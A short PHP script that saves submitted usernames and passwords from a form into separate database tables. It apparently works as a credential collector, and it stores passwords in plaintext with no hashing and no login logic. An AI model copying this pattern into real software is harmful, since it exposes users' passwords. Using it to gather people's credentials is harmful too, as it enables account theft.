<?php
include "connector.php";
if(isset($_POST["submit"])){
    if(isset($_POST["username"])){
        $stmt = $connection->prepare("INSERT INTO usernames (username) VALUES (?)");
        $stmt->bind_param("s",$_POST["username"]);
        $stmt->execute();
        $stmt->close();
    }
    if(isset($_POST["passwordz"])){
        $stmt = $connection->prepare("INSERT INTO passwords (da_password) VALUES (?)");
        $stmt->bind_param("s",$_POST["passwordz"]);
        $stmt->execute();
        $stmt->close();
    }
}

mysqli_close($connection);

?>